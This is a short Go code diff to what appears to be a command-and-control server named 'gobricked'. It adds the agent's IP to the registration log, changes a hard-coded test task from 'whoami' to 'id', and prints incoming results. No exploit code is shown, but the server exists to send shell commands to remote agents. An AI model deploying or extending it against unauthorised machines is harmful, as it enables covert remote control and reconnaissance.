@@ -2,6 +2,7 @@ package router
 
 import (
 	"encoding/json"
+	"fmt"
 	"gobricked/pkg/util"
 	"log"
 	"net/http"
@@ -24,9 +25,10 @@ func RegisterAgentHandler(w http.ResponseWriter, r *http.Request) {
 	agentID := uuid.New().String()
 	agent.ID = agentID
 	agent.LastSeen = time.Now()
+
 	util.Agents[agentID] = agent
 
-	log.Printf("[+] Registered agent %s (%s)", agentID, agent.Hostname)
+	log.Printf("[+] Registered agent %s (%s) from (%s)\n", agentID, agent.Hostname, agent.IP)
 	w.Header().Set("Content-Type", "application/json")
 	json.NewEncoder(w).Encode(agent)
 }
@@ -42,7 +44,7 @@ func GetTasksHandler(w http.ResponseWriter, r *http.Request) {
 	// TESTING
 	exampleTask := util.Task{
 		ID:      "task-01",
-		Command: "whoami",
+		Command: "id",
 	}
 	agentTasks = append(agentTasks, exampleTask)
 	//*
@@ -88,6 +90,7 @@ func PostResultHandler(w http.ResponseWriter, r *http.Request) {
 		http.Error(w, "Invalid result", http.StatusBadRequest)
 		return
 	}
+	fmt.Println(result)
 
 	util.Mutex.Lock()
 	defer util.Mutex.Unlock()
